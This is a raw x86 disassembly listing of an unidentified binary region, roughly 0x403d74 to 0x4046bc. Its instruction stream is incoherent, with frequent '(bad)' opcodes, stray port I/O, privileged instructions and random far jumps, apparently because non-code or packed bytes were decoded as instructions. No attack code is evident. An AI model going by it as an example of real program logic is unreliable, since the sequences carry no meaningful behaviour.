  403d74:	add    DWORD PTR [edx+0x71a3af1b],ebp
  403d7a:	xchg   DWORD PTR [ebx],eax
  403d7c:	cmp    bl,BYTE PTR [ecx-0x34]
  403d7f:	ret    0x3a88
  403d82:	fisttp DWORD PTR [ebx+0x23b5ea94]
  403d88:	xchg   dl,ch
  403d8a:	mov    ch,0x8d
  403d8c:	adc    BYTE PTR [esi],ch
  403d8e:	jl     0x403deb
	...
  403da4:	jnp    0x403d5c
  403da6:	cmovle esp,DWORD PTR [esp+edx*4-0x6c823ae0]
  403dae:	cmp    ecx,DWORD PTR [edi-0x18a69c9a]
  403db4:	push   esp
  403db5:	arpl   WORD PTR [ecx-0x77],bx
  403db8:	lock xchg BYTE PTR [edi-0x1de2172d],cl
  403dbf:	pop    ecx
  403dc0:	jo     0x403e17
  403dc2:	and    dl,BYTE PTR [edx]
  403dc4:	(bad)  
  403dc5:	dec    ebp
  403dc6:	push   0xffffffbd
  403dc8:	jg     0x403df4
  403dca:	ret    0x5fbe
  403dcd:	sub    ah,BYTE PTR [eax+eax*4-0x75]
  403dd1:	jb     0x403dc3
  403dd3:	xchg   ebx,eax
  403dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dd5:	xchg   ebx,eax
  403dd6:	scas   eax,DWORD PTR es:[edi]
  403dd7:	repz dec esp
  403dd9:	push   esp
  403dda:	out    0x6,al
  403ddc:	iret   
  403ddd:	sbb    cl,BYTE PTR [edx]
  403ddf:	test   DWORD PTR [ebx+esi*2],0x18f4f6f9
  403de6:	pop    ebp
  403de7:	adc    ebx,DWORD PTR [edi]
  403de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dea:	mov    DWORD PTR [eax-0x3ae24171],edi
  403df0:	into   
  403df1:	xchg   edi,eax
  403df2:	loop   0x403dc7
  403df4:	pop    es
  403df5:	sub    al,0x12
  403df7:	mov    edi,0xbef22aaf
  403dfc:	sbb    DWORD PTR [eax],ebx
  403dfe:	out    0x89,al
  403e00:	dec    edi
  403e01:	lods   eax,DWORD PTR ds:[esi]
  403e02:	xchg   DWORD PTR [esi],eax
  403e04:	dec    edx
  403e05:	ins    BYTE PTR es:[edi],dx
  403e06:	mov    al,ds:0xc4
	...
  403e1b:	add    BYTE PTR [ebp-0x5971446d],bl
  403e21:	bound  ebp,QWORD PTR [ecx-0x669d5b1a]
  403e27:	mov    al,bh
  403e29:	xchg   al,al
  403e2b:	or     ebx,eax
  403e2d:	fsubr  st(2),st
  403e2f:	pop    ecx
  403e30:	enter  0xa253,0x11
  403e34:	(bad)  
  403e35:	dec    ebx
  403e36:	or     BYTE PTR [edx+0x38],ah
  403e39:	(bad)  
  403e3b:	retf   0x6231
  403e3e:	icebp  
  403e3f:	je     0x403e2c
  403e41:	lea    ebp,[edx+0x4]
  403e44:	xchg   BYTE PTR [esi],bl
  403e46:	or     ebp,DWORD PTR [edi-0x1b37aaa5]
  403e4c:	mov    dl,BYTE PTR [ecx-0x7d]
  403e4f:	inc    edx
  403e50:	inc    edx
  403e51:	push   ds
  403e52:	sub    eax,DWORD PTR [eax+0x3a]
  403e55:	sub    eax,DWORD PTR [ebp-0x442b61a3]
  403e5b:	test   eax,0x15e924f
  403e60:	push   ecx
  403e61:	push   ebx
  403e62:	add    edx,ebp
  403e64:	aas    
  403e65:	sbb    dh,al
  403e67:	fcmovu st,st(1)
  403e69:	jno    0x403e5e
  403e6b:	fcmovbe st,st(7)
  403e6d:	pop    ss
  403e6e:	test   dh,dh
  403e70:	pusha  
  403e71:	retf   0xc756
  403e74:	mov    dl,dh
  403e76:	and    al,0x28
  403e78:	rcl    BYTE PTR [esi+0x2b02230b],1
  403e7e:	cmp    esp,eax
	...
  403e94:	icebp  
  403e95:	sbb    eax,0x90be33b
  403e9a:	pop    ss
  403e9b:	or     ebp,0xffffffde
  403e9e:	loopne 0x403e8a
  403ea0:	jne    0x403ef5
  403ea2:	retf   
  403ea3:	fst    QWORD PTR [eax-0x463f7cb5]
  403ea9:	sub    ch,BYTE PTR [ebx]
  403eab:	mov    bl,0xc1
  403ead:	sub    al,0x85
  403eaf:	gs (bad) 
  403eb1:	(bad)  
  403eb2:	sbb    dh,dl
  403eb4:	mov    ebp,0xcef54e91
  403eb9:	push   esp
  403eba:	or     eax,0xf319d0ea
  403ebf:	fcmovbe st,st(7)
  403ec1:	jno    0x403eb4
  403ec3:	add    BYTE PTR [esi-0x18],al
  403ec6:	test   BYTE PTR [edx+ebx*2+0x67441cc0],dl
  403ecd:	nop
  403ece:	pop    esi
  403ecf:	sub    BYTE PTR [esi+ecx*2],ah
  403ed2:	add    DWORD PTR [ebx],eax
  403ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed5:	pop    ss
  403ed6:	lock xor ebp,edi
  403ed9:	das    
  403eda:	repnz xor edi,DWORD PTR [ebp-0x1bf07bf3]
  403ee1:	repnz test al,0xd8
  403ee4:	(bad)  ss:[ecx+eax*8]
  403ee8:	je     0x403e84
  403eea:	or     ecx,edx
  403eec:	scas   al,BYTE PTR es:[edi]
  403eed:	out    0x3a,al
  403eef:	stc    
  403ef0:	xchg   al,ch
  403ef2:	cmp    bh,dl
  403ef4:	mov    al,ds:0xc8170c
	...
  403f09:	add    BYTE PTR [eax],al
  403f0b:	add    BYTE PTR [esi+0x3f],ch
  403f0e:	out    dx,eax
  403f0f:	add    esp,ebx
  403f11:	or     cl,0xc3
  403f14:	sbb    DWORD PTR [eax+0x1f8c8bd1],edx
  403f1a:	repnz and ecx,DWORD PTR [edi+0x698df01f]
  403f21:	xchg   ebx,eax
  403f22:	out    dx,al
  403f23:	int    0x84
  403f25:	xor    DWORD PTR [edx],ecx
  403f27:	inc    esi
  403f28:	cdq    
  403f29:	push   ecx
  403f2a:	enter  0xf605,0x4f
  403f2e:	cmp    ebx,0x76
  403f31:	call   0xe7b73860
  403f36:	test   BYTE PTR [edx+ebp*8-0x9c8f0be],dl
  403f3d:	(bad)  
  403f3e:	pop    esi
  403f3f:	cmp    ah,ah
  403f41:	dec    esi
  403f42:	add    DWORD PTR [ebx],eax
  403f44:	adc    eax,0xef33f018
  403f49:	das    
  403f4a:	repnz xor ebp,ebp
  403f4d:	or     eax,0xb68c0f84
  403f52:	push   cs
  403f53:	aad    0x98
  403f55:	cmp    DWORD PTR [ecx+0xc],eax
  403f58:	dec    ebp
  403f59:	in     eax,dx
  403f5a:	add    BYTE PTR [ebx],al
  403f5c:	push   esi
  403f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f5e:	mov    ch,0x33
  403f60:	jne    0x403fb1
  403f62:	mov    bl,0x33
  403f64:	jbe    0x403f27
  403f66:	lahf   
  403f67:	pop    ds
  403f68:	jns    0x403f8c
  403f6a:	push   ebp
  403f6b:	inc    ebp
  403f6c:	(bad)  
  403f6d:	jecxz  0x403f59
  403f6f:	rol    BYTE PTR [eax],0x0
	...
  403f82:	add    BYTE PTR [eax],al
  403f84:	dec    edi
  403f85:	and    cl,BYTE PTR [ecx+ebx*8]
  403f88:	pop    es
  403f89:	(bad)  
  403f8c:	outs   dx,DWORD PTR ds:[esi]
  403f8d:	xlat   BYTE PTR ds:[ebx]
  403f8e:	cld    
  403f8f:	clc    
  403f90:	adc    DWORD PTR [edx-0x30dafaf8],edi
  403f96:	bound  eax,QWORD PTR [ebx]
  403f98:	retf   0xca29
  403f9b:	rcl    BYTE PTR [ecx+0x278bcc2e],0x3f
  403fa2:	mov    bl,0x23
  403fa4:	adc    eax,0xf88db43f
  403fa9:	sub    dh,BYTE PTR [ebx+0xc99fba3]
  403faf:	push   esi
  403fb0:	xchg   esp,eax
  403fb1:	ins    BYTE PTR es:[edi],dx
  403fb2:	int    0x9
  403fb4:	(bad)  
  403fb5:	jge    0x403f3b
  403fb7:	clc    
  403fb8:	mov    edi,0x9ffaeb27
  403fbd:	xor    eax,0x54938c81
  403fc2:	or     ch,BYTE PTR [edi+0x73]
  403fc5:	cs dec ebp
  403fc7:	sbb    al,0xcd
  403fc9:	in     al,dx
  403fca:	or     eax,0xb2a6d603
  403fcf:	xor    eax,ebp
  403fd1:	mov    ?,WORD PTR [ebx+esi*1+0x1f90b8b6]
  403fd8:	push   es
  403fd9:	and    dl,0x8c
  403fdc:	(bad)  
  403fdd:	xchg   esp,eax
  403fde:	dec    edi
  403fdf:	hlt    
  403fe0:	int3   
  403fe1:	push   edi
  403fe2:	std    
  403fe3:	add    dh,BYTE PTR [ebp+0xf3980f]
	...
  403ff9:	add    BYTE PTR [eax],al
  403ffb:	add    BYTE PTR [ebp+0x10899a67],dl
  404001:	fwait
  404002:	and    edi,ebp
  404004:	test   DWORD PTR [ebx],esp
  404006:	loop   0x404045
  404008:	mov    al,ds:0x8f00a155
  40400d:	push   edi
  40400e:	push   0xffffffbb
  404010:	lahf   
  404011:	sbb    eax,0x811bc12
  404016:	inc    BYTE PTR [edx+eiz*2-0x45fc995b]
  40401d:	je     0x40403f
  40401f:	ret    0x9797
  404022:	adc    DWORD PTR [ebx-0xcb598bc],ecx
  404028:	xor    eax,0x6e076d11
  40402d:	mov    ch,0x44
  40402f:	sub    DWORD PTR [edi+0x4dc4ddd2],ecx
  404035:	test   dl,ah
  404037:	leave  
  404038:	pop    es
  404039:	push   ds
  40403a:	sar    BYTE PTR [ebx-0x67abe2a1],cl
  404040:	stos   DWORD PTR es:[edi],eax
  404041:	nop
  404042:	leave  
  404043:	mov    al,ds:0xfb979701
  404048:	int3   
  404049:	push   esi
  40404a:	(bad)  
  40404b:	add    dl,ch
  40404d:	push   cs
  40404e:	clc    
  40404f:	repnz in eax,0x66
  404052:	jmp    0x1aaa:0x2d9b0888
  404059:	clc    
  40405a:	loope  0x404099
  40405c:	mov    BYTE PTR [ebp-0x5f],dl
  40405f:	inc    DWORD PTR [eax]
	...
  404071:	add    BYTE PTR [eax],al
  404073:	add    BYTE PTR [esi+0x7fba7a57],cl
  404079:	sbb    eax,0x809bbf2
  40407e:	or     dh,bl
  404080:	and    BYTE PTR [ebx-0x2a],dl
  404083:	and    cl,BYTE PTR [edi-0x3257e736]
  404089:	mov    cs,WORD PTR [ebx]
  40408b:	mov    ecx,0x923b1c06
  404090:	sahf   
  404091:	sbb    al,0x85
  404093:	pop    ebp
  404094:	xchg   edx,eax
  404095:	mov    ah,0x43
  404097:	inc    edx
  404098:	xor    DWORD PTR [esi+0x5450dd46],edx
  40409e:	sbb    dl,ch
  4040a0:	inc    ebp
  4040a1:	push   cs
  4040a2:	repnz mov edx,0x74f16627
  4040a8:	sti    
  4040a9:	cmp    DWORD PTR [eax-0x63],0xb70ae2e2
  4040b0:	addr16 push ebp
  4040b2:	retf   
  4040b3:	test   BYTE PTR [esi+0x3e40833b],0x1c
  4040ba:	cmp    eax,DWORD PTR [edx+0x4]
  4040bd:	sbb    DWORD PTR [edi],ecx
  4040bf:	das    
  4040c0:	jns    0x4040bf
  4040c2:	pop    ds
  4040c3:	jmp    0x9723:0x29c96869
  4040ca:	retf   
  4040cb:	jb     0x4040a3
  4040cd:	gs icebp 
  4040cf:	fcmovbe st,st(7)
  4040d1:	setl   dh
  4040d4:	inc    ebp
  4040d5:	jp     0x404080
  4040d7:	adc    eax,DWORD PTR [eax]
	...
  4040e9:	add    BYTE PTR [eax],al
  4040eb:	add    BYTE PTR [esi-0x79d43676],cl
  4040f1:	xchg   ebp,eax
  4040f2:	fsub   DWORD PTR [edx+0x37]
  4040f5:	repz mov dx,0x1025
  4040fa:	test   dh,dh
  4040fc:	bound  esp,QWORD PTR [edi+eiz*8-0x4b]
  404100:	(bad)  
  404101:	rol    BYTE PTR [eax+ebp*4],cl
  404104:	iret   
  404105:	test   BYTE PTR [ebx],cl
  404107:	mov    ds:0x3b1f15,eax
  40410c:	int    0x23
  40410e:	lock lea ebx,[ecx-0x79]
  404112:	or     eax,0xb942d1d
  404117:	pop    esi
  404118:	mov    ebp,0xb617cb56
  40411d:	ds cmp ecx,0xffffffb6
  404121:	fstp   TBYTE PTR [edx]
  404123:	sti    
  404124:	sub    BYTE PTR [edi+ecx*1],dl
  404127:	cmp    DWORD PTR [ebp+0x44],eax
  40412a:	rol    DWORD PTR [ebx],1
  40412c:	mov    bl,0x34
  40412e:	enter  0x71c0,0x94
  404132:	retf   
  404133:	mov    edi,esi
  404135:	and    esi,eax
  404137:	xor    ebx,ebp
  404139:	sbb    DWORD PTR [edi+edx*1-0x192d0230],ebx
  404140:	iretw  
  404142:	cmp    cl,al
  404144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404145:	mov    ecx,DWORD PTR [ebx]
  404147:	shr    BYTE PTR [esi+0x46fb3ae0],1
  40414d:	fild   DWORD PTR [esp+ecx*4+0x0]
	...
  404164:	sub    bl,ch
  404166:	jae    0x40410a
  404168:	pop    edx
  404169:	xchg   esp,eax
  40416a:	inc    esi
  40416b:	cmp    al,0x74
  40416d:	push   ebp
  40416e:	sbb    BYTE PTR [ebx],al
  404170:	pop    edi
  404171:	or     esi,edx
  404173:	xor    ebp,DWORD PTR [ebp+0x23]
  404176:	lock lea ebx,[ecx-0x36a99279]
  40417d:	push   esp
  40417e:	or     ebx,DWORD PTR [esi-0x3]
  404181:	push   ebp
  404182:	retf   
  404183:	pop    ss
  404184:	out    0x3d,al
  404186:	mov    bh,0xff
  404188:	cli    
  404189:	out    0xf6,eax
  40418b:	xor    ebx,edi
  40418d:	mov    esi,ebx
  40418f:	xor    ebp,esp
  404191:	sbb    DWORD PTR [edi+eax*1-0xbdfc94f],ecx
  404198:	mov    WORD PTR [esi],gs
  40419a:	cmc    
  40419b:	ror    ah,0x38
  40419e:	or     bl,al
  4041a0:	add    ebx,DWORD PTR [edx-0x44]
  4041a3:	(bad)  
  4041a4:	mov    ebx,0xb40bb21d
  4041a9:	sbb    eax,0x4a008db0
  4041ae:	test   bh,bh
  4041b0:	jbe    0x404220
  4041b2:	or     DWORD PTR [esi+0x78],edx
  4041b5:	in     al,dx
  4041b6:	enter  0x8f0a,0xdb
  4041ba:	jnp    0x4041bb
  4041bc:	mov    ecx,DWORD PTR [edi]
  4041be:	mov    esp,0xb1238733
  4041c3:	xor    esi,DWORD PTR [ecx+esi*4-0x71]
  4041c7:	sldt   WORD PTR [eax]
	...
  4041da:	add    BYTE PTR [eax],al
  4041dc:	sub    ecx,DWORD PTR [ebx-0x79]
  4041df:	stos   DWORD PTR es:[edi],eax
  4041e0:	(bad)  
  4041e1:	jg     0x4041d7
  4041e3:	ror    BYTE PTR [ebp+0x27],0x8
  4041e7:	retf   0xbf1b
  4041ea:	mov    esp,0xb47b53ff
  4041ef:	or     eax,DWORD PTR [ebp+0x7b]
  4041f2:	mov    dl,0x8d
  4041f4:	and    BYTE PTR [edi],dh
  4041f6:	repnz lahf 
  4041f8:	pop    ds
  4041f9:	bound  ecx,QWORD PTR [eax]
  4041fb:	pop    esi
  4041fc:	cwde   
  4041fd:	ins    BYTE PTR es:[edi],dx
  4041fe:	enter  0x8f15,0x84
  404202:	jl     0x404203
  404204:	and    esi,DWORD PTR [edi-0x44]
  404207:	xor    edx,DWORD PTR [esi]
  404209:	and    esi,DWORD PTR [eax+0x77b91533]
  40420f:	pop    es
  404210:	iret   
  404211:	in     al,0x4f
  404213:	gs (bad) 
  404215:	out    dx,eax
  404216:	cli    
  404217:	ror    ah,0x37
  40421a:	or     bl,al
  40421c:	xor    esp,DWORD PTR [edi]
  40421e:	mov    ebx,0xb1daebff
  404223:	or     esp,esp
  404225:	xchg   esp,eax
  404226:	adc    ch,BYTE PTR [edi-0x6a01f6f7]
  40422c:	rcl    BYTE PTR [eax-0x6f9df892],0xa0
  404233:	(bad)  
  404234:	xchg   esi,eax
  404235:	xchg   ebx,eax
  404236:	xchg   ecx,eax
  404237:	jae    0x4041f4
  404239:	pop    ds
  40423a:	mov    dh,0xb3
  40423c:	jg     0x404259
  40423e:	jmp    0x0:0xad
	...
  404251:	add    BYTE PTR [eax],al
  404253:	add    BYTE PTR [edi+0x1c],bl
  404256:	push   esp
  404257:	adc    BYTE PTR [ebx-0x645c6a5f],0x93
  40425e:	daa    
  40425f:	fmul   st(4),st
  404261:	push   ebp
  404262:	out    dx,al
  404263:	push   es
  404264:	push   esi
  404265:	fild   WORD PTR [ebp-0x4de07c4d]
  40426b:	stos   DWORD PTR es:[edi],eax
  40426c:	xchg   DWORD PTR ds:0x1adb2,ebx
  404272:	(bad)  
  404274:	leave  
  404275:	sbb    BYTE PTR [edi+eax*1-0x3e],ch
  404279:	cwde   
  40427a:	and    bh,al
  40427c:	adc    DWORD PTR [ebx+0x1f537348],0x1a7fb35e
  404286:	jmp    0x9388:0x7c1d7fae
  40428d:	iret   
  40428e:	mov    bh,0x5b
  404290:	mov    ds:0x4ce3a793,eax
  404295:	push   esp
  404296:	out    dx,eax
  404297:	push   es
  404298:	dec    edi
  404299:	fild   QWORD PTR ds:0xd21f1bb3
  40429f:	lods   al,BYTE PTR ds:[esi]
  4042a0:	xchg   DWORD PTR [edx+edx*8],ebx
  4042a3:	scas   al,BYTE PTR es:[edi]
  4042a4:	sbb    DWORD PTR [eax],ecx
  4042a6:	(bad)  
  4042a7:	mov    ds:0x70f6fea,eax
  4042ac:	bound  esp,QWORD PTR [eax+0x20]
  4042af:	mov    BYTE PTR [esi+0x5f190893],0x1f
  4042b6:	imul   esi
	...
  4042cc:	push   ds
  4042cd:	arpl   bx,si
  4042cf:	repnz sub DWORD PTR [ebx-0x10],esp
  4042d3:	ins    BYTE PTR es:[edi],dx
  4042d4:	push   ebx
  4042d5:	(bad)  
  4042d6:	sbb    al,0x2a
  4042d8:	xchg   ecx,eax
  4042d9:	repz or bl,BYTE PTR [edi]
  4042dc:	nop
  4042dd:	push   ebp
  4042de:	leave  
  4042df:	not    BYTE PTR [edx-0x14148b6]
  4042e5:	push   ds
  4042e6:	idiv   edx
  4042e8:	test   DWORD PTR [edx+0x10f1faf1],0x85310694
  4042f2:	add    BYTE PTR [edi],ch
  4042f4:	mov    edi,DWORD PTR [esi-0x77ad57c4]
  4042fa:	or     esi,DWORD PTR [eax-0x7908e202]
  404300:	ds (bad) 
  404303:	repnz and ah,BYTE PTR [edx-0xf]
  404307:	adc    edx,DWORD PTR fs:[esi+0x25baef8a]
  40430e:	or     ebp,DWORD PTR [edi-0x1837ac81]
  404314:	mov    dl,BYTE PTR [ecx-0x49]
  404317:	push   esi
  404318:	(bad)  
  404319:	sbb    eax,0x89f11af7
  40431e:	lock cli 
  404320:	jmp    0x3224:0x34d69c0f
  404327:	je     0x4042bb
  404329:	(bad)  
  40432a:	and    al,0x28
  40432c:	dec    ecx
  40432d:	mov    ecx,DWORD PTR [ebx]
  40432f:	cmp    DWORD PTR [eax],eax
	...
  404341:	add    BYTE PTR [eax],al
  404343:	add    BYTE PTR [esi-0x21e108e3],bl
  404349:	popa   
  40434a:	repz loop 0x404386
  40434d:	(bad)  
  40434e:	lock pop esp
  404350:	or     DWORD PTR [ebp+0x3a9700b3],0x22
  404357:	add    esp,DWORD PTR [ebx]
  404359:	sbb    cl,al
  40435b:	shl    edx,0x96
  40435e:	ret    0xf2bf
  404361:	jecxz  0x404359
  404363:	push   DWORD PTR [esi-0x10]
  404366:	add    bh,cl
  404368:	jbe    0x404358
  40436a:	test   BYTE PTR [edx+eax*8-0x317924fe],bl
  404371:	xchg   edi,eax
  404372:	push   esi
  404373:	and    al,0xe4
  404375:	push   edi
  404376:	sbb    eax,0x759fec03
  40437b:	or     BYTE PTR [esp+ecx*4-0x6d56a0f7],dh
  404382:	inc    edi
  404383:	or     BYTE PTR [esp+edi*4-0x1b9f00fc],ah
  40438a:	test   BYTE PTR [esi-0x4b],dh
  40438d:	xchg   ebx,eax
  40438e:	or     DWORD PTR [edi],0x5af6e31f
  404394:	lods   al,BYTE PTR ds:[esi]
  404395:	iret   
  404396:	push   eax
  404397:	pop    edi
  404398:	xchg   ebx,eax
  404399:	fxch   st(1)
  40439b:	or     al,0x75
  40439d:	mov    BYTE PTR [ebx-0xfb30914],0x57
  4043a4:	sbb    ecx,eax
  4043a6:	iret   
  4043a7:	inc    ebp
	...
  4043bc:	mov    cl,0x98
  4043be:	or     BYTE PTR [eax],al
  4043c0:	xor    eax,0xe20c7ce4
  4043c5:	aad    0xf0
  4043c7:	(bad)  
  4043c8:	sub    cl,dl
  4043ca:	test   DWORD PTR [ecx+0x25],eax
  4043cd:	xchg   edx,eax
  4043ce:	sub    eax,DWORD PTR [ebp+0x5a]
  4043d1:	dec    esp
  4043d2:	or     eax,0x8d1c044
  4043d7:	mov    DWORD PTR [esi+0x28c7e6dd],edi
  4043dd:	pop    ecx
  4043de:	test   DWORD PTR [ecx-0x74],eax
  4043e1:	sub    edi,DWORD PTR [ecx-0x3e5cb924]
  4043e7:	add    eax,0x4ba848
  4043ec:	jp     0x4043f5
  4043ee:	std    
  4043ef:	psrlq  mm5,QWORD PTR [edi]
  4043f2:	pop    ebx
  4043f3:	lea    ecx,[ebp+0x2b]
  4043f6:	mov    ebx,0x93e9bee1
  4043fb:	sbb    al,0x7
  4043fd:	js     0x4043f3
  4043ff:	add    dl,BYTE PTR [ecx+0x47]
  404402:	adc    eax,0x77673440
  404407:	inc    ecx
  404408:	mov    WORD PTR [ebx-0x6c],?
  40440b:	inc    eax
  40440c:	test   eax,0x5183b7dd
  404411:	out    0x4a,eax
  404413:	call   0x4b6ee8
  404418:	js     0xdd5f84c2
  40441e:	jae    0x40447d
	...
  404434:	test   BYTE PTR [edi+0x711740cc],ch
  40443a:	hlt    
  40443b:	add    dl,cl
  40443d:	adc    DWORD PTR [eax+ebp*2-0x28],ebx
  404441:	test   al,0x4a
  404443:	add    BYTE PTR [ebp+edx*1-0x549c1afe],bh
  40444a:	or     bl,BYTE PTR [ebp+0x58]
  40444d:	ins    BYTE PTR es:[edi],dx
  40444e:	mov    WORD PTR [ecx+eax*1-0x13],ss
  404452:	or     al,BYTE PTR [eax+0x75f0d70f]
  404458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404459:	scas   al,BYTE PTR es:[edi]
  40445a:	xchg   esp,eax
  40445b:	or     al,al
  40445d:	daa    
  40445e:	mov    esp,DWORD PTR [ebx+0x4aa918]
  404464:	mov    esi,gs
  404466:	and    dh,dh
  404468:	xor    al,0xb7
  40446a:	or     eax,DWORD PTR [eax]
  40446c:	mov    WORD PTR [edx+ebp*2+0x161c13bb],ss
  404473:	pushf  
  404474:	mov    fs,WORD PTR [eax+0x92f83eb]
  40447a:	push   esp
  40447b:	inc    edx
  40447c:	mov    WORD PTR [edx+eiz*4-0x53f005d5],ss
  404483:	jmp    DWORD PTR [ecx*4+0x678c03e1]
  40448a:	adc    edi,DWORD PTR [eax-0x467413]
  404490:	(bad)
  404493:	or     DWORD PTR [ebp-0x6c],0x1968
	...
  4044aa:	add    BYTE PTR [eax],al
  4044ac:	adc    BYTE PTR [edx],cl
  4044ae:	and    BYTE PTR [esp+eiz*4],al
  4044b1:	mov    esp,0xf58c03e1
  4044b6:	and    BYTE PTR [ecx+0x196a944d],al
  4044bc:	dec    eax
  4044bd:	or     DWORD PTR [eax],esp
  4044bf:	add    al,0x7
  4044c1:	mov    bh,BYTE PTR [ecx]
  4044c3:	or     DWORD PTR [ebp-0x6c],0x4e9bbbe6
  4044ca:	out    dx,al
  4044cb:	mov    esp,0x4554d42f
  4044d0:	mov    WORD PTR ds:0xd50147d4,cs
  4044d6:	loope  0x404554
  4044d8:	cdq    
  4044d9:	int3   
  4044da:	ins    BYTE PTR es:[edi],dx
  4044db:	inc    ebp
  4044dc:	mov    ebp,?
  4044de:	adc    al,0x81
  4044e0:	int    0x94
  4044e2:	jp     0x4044fd
  4044e4:	mov    esp,0x9b03a009
  4044e9:	dec    esp
  4044ea:	out    dx,al
  4044eb:	mov    ecx,0x4554c7ef
  4044f0:	mov    WORD PTR ds:0xd50153d4,cs
  4044f6:	loope  0x404511
  4044f8:	sbb    BYTE PTR [ebx],0x8
  4044fb:	mov    esp,0x5c48ac7f
  404500:	rcl    DWORD PTR [eax+eiz*8-0x8e51465],1
  404507:	ret    0xbb59
  40450a:	shr    DWORD PTR [ebx],0x8c
  40450d:	xchg   esp,eax
  40450e:	pop    ebp
  40450f:	bound  eax,QWORD PTR [eax]
	...
  404521:	add    BYTE PTR [eax],al
  404523:	add    BYTE PTR [edi+edx*1],ch
  404526:	int3   
  404527:	add    DWORD PTR [ecx+0x1c],esp
  40452a:	idiv   esi
  40452c:	cmp    cl,BYTE PTR [edi]
  40452e:	or     al,0x24
  404530:	add    al,0x9
  404532:	dec    ecx
  404533:	jmp    0x8205c58e
  404538:	or     al,0xd5
  40453a:	or     dh,ch
  40453c:	pop    es
  40453d:	mov    eax,edx
  40453f:	pusha  
  404540:	mov    ecx,DWORD PTR [ecx-0x64]
  404543:	pop    esp
  404544:	push   eax
  404545:	xchg   esp,eax
  404546:	sbb    ebp,0x2884fbcc
  40454c:	nop
  40454d:	aad    0x7d
  40454f:	xchg   esp,eax
  404550:	xor    BYTE PTR [edi+esi*8-0x52],dl
  404554:	jmp    0x490a:0x17740c0e
  40455b:	jmp    0x1dc5c666
  404560:	add    dl,ah
  404562:	or     dl,bl
  404564:	xchg   ebx,eax
  404565:	pop    es
  404566:	push   esp
  404567:	ja     0x404531
  404569:	xchg   esp,eax
  40456a:	cmp    edx,ebp
  40456c:	or     al,0xc1
  40456e:	xchg   BYTE PTR [eax],ch
  404570:	mov    BYTE PTR [ebp-0x36],ah
  404573:	cwde   
  404574:	dec    edi
  404575:	or     al,0xc
  404577:	je     0x404574
  404579:	or     cl,BYTE PTR [ecx-0x17]
  40457c:	rcr    BYTE PTR [edi-0x2b639d22],1
  404582:	test   DWORD PTR [eax+0x3d0d8f],ebp
	...
  40459c:	loope  0x4045b2
  40459e:	dec    ecx
  40459f:	add    BYTE PTR [esi-0xb72b0dc],bl
  4045a5:	xchg   ebp,eax
  4045a6:	div    DWORD PTR ds:0x4914f9
  4045ac:	call   0x85c5:0xe0fff4cc
  4045b3:	inc    ecx
  4045b4:	cmc    
  4045b5:	call   0xfff6:0xf95cf84d
  4045bc:	mov    bl,BYTE PTR [esi-0x1d4d7422]
  4045c2:	fldenv [ebx]
  4045c4:	mov    bl,0x36
  4045c6:	pop    esp
  4045c7:	cld    
  4045c8:	out    dx,al
  4045c9:	push   ebx
  4045ca:	or     eax,DWORD PTR [eax+ebx*2]
  4045cd:	lods   al,BYTE PTR ds:[esi]
  4045ce:	test   DWORD PTR [ecx-0x4b],eax
  4045d1:	xchg   esp,eax
  4045d2:	dec    ebp
  4045d3:	clc    
  4045d4:	mov    al,0xe
  4045d6:	jno    0x40455a
  4045d8:	jg     0x4045c1
  4045da:	jl     0x4045d8
  4045dc:	cmp    dl,cl
  4045de:	lock mov DWORD PTR [eax-0x1c],ebp
  4045e2:	enter  0xbbc6,0x9c
  4045e6:	test   BYTE PTR [ebx+0x5cb55d6],0xa6
  4045ed:	dec    ebp
  4045ee:	dec    ecx
  4045ef:	jne    0x40462a
  4045f1:	lods   eax,DWORD PTR ds:[esi]
  4045f2:	in     al,0xff
  4045f4:	sbb    ah,bh
  4045f6:	add    dh,0xee
  4045f9:	aas    
  4045fa:	cmp    eax,DWORD PTR [ebp+0x9]
  4045fd:	and    ecx,ecx
  4045ff:	add    eax,DWORD PTR [eax]
	...
  404611:	add    BYTE PTR [eax],al
  404613:	add    BYTE PTR [ecx-0x66],dh
  404616:	cld    
  404617:	lea    esi,[eax+edx*4-0x6e22baf5]
  40461e:	test   eax,0xf77acceb
  404623:	jne    0x40460e
  404625:	xchg   edi,eax
  404626:	dec    ebp
  404627:	clc    
  404628:	mov    WORD PTR [edi+eiz*1+0x6714dfc],?
  40462f:	mov    esi,DWORD PTR [edx]
  404631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404632:	mov    ecx,0x8304fc1
  404637:	fmul   st,st(5)
  404639:	fcomp  st(2)
  40463b:	mov    ecx,0xffa56a28
  404640:	pop    es
  404641:	push   0x71
  404643:	push   ebp
  404644:	or     BYTE PTR [esi],ah
  404646:	dec    esi
  404647:	cld    
  404648:	scas   eax,DWORD PTR es:[edi]
  404649:	pop    edx
  40464a:	jmp    0x9adce14
  40464f:	add    al,0x1
  404651:	out    0x74,eax
  404653:	inc    ecx
  404654:	mov    WORD PTR [esi],gs
  404656:	dec    esi
  404657:	clc    
  404658:	mov    DWORD PTR [edi+0x78],edi
  40465b:	sbb    ecx,DWORD PTR [ebx]
  40465d:	sub    bh,BYTE PTR [esi]
  40465f:	cld    
  404660:	add    ebp,DWORD PTR [eax-0x5c]
  404663:	mov    DWORD PTR [ecx+0x37],ecx
  404666:	retf   0xa2c6
  404669:	mov    dh,0xa5
  40466b:	mov    edi,DWORD PTR [edi-0x70fa3815]
  404671:	repz dec ecx
  404673:	jne    0x40464c
  404675:	adc    edx,DWORD PTR [edi+0xff]
	...
  40468b:	add    BYTE PTR [ebx+0x7c66fe1],ah
  404691:	add    bh,al
  404693:	inc    esp
  404694:	nop
  404695:	cmp    eax,0xa89003c9
  40469a:	lahf   
  40469b:	mov    cs,ebp
  40469d:	sub    eax,0x31744508
  4046a2:	ffree  st(1)
  4046a4:	out    dx,al
  4046a5:	jecxz  0x40464a
  4046a7:	jne    0x404711
  4046a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046aa:	dec    esi
  4046ab:	clc    
  4046ac:	adc    eax,0x52c1a721
  4046b1:	dec    eax
  4046b2:	jo     0x4046b2
  4046b4:	pop    es
  4046b5:	xchg   ebp,eax
  4046b6:	push   edx
  4046b7:	ret    0x924f
  4046ba:	loop   0x404687
  4046bc:	int    0xa1
